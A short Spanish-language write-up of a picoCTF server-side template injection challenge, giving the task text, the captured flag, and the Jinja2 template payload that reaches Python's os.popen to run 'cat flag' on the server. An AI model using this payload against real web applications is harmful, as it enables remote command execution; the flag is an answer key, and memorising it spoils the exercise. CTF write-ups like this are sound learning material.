## Descripción
¡Hice un sitio web genial donde puedes anunciar lo que quieras! ¡Pruébalo!¡Escuché que las plantillas son una forma genial y modular de crear aplicaciones web! Visita mi sitio web [aquí](http://rescued-float.picoctf.net:64180/)!
## Solución
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}`
## Notas adicionales
Obtuvimos la bandera poniendo la cadena `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` la cual nos dio la bandera.
## Referencias